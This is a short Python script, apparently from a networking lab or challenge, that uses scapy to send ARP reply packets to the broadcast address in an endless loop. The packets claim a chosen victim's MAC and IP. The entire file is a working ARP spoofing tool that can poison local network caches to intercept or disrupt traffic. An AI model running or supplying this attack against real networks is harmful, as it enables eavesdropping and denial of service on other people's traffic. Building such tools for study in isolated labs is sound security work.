from scapy.all import *
import typer
from rich.console import Console
console = Console()


BROADCAST = "FF:FF:FF:FF:FF:FF"
#Victim ip address must be the same destination ip address (H2_ip) set in the ARPSpooferChallengeSender.py
def main(victim_mac: str, victim_ip: str):
    pkt = Ether(src=victim_mac, dst=BROADCAST)/ARP(op=2, hwsrc=victim_mac, pdst=victim_ip)
    with console.status("Sending Packets..."):
        sendp(pkt, loop=1, inter=0.2)




if __name__ == "__main__":
    typer.run(main)
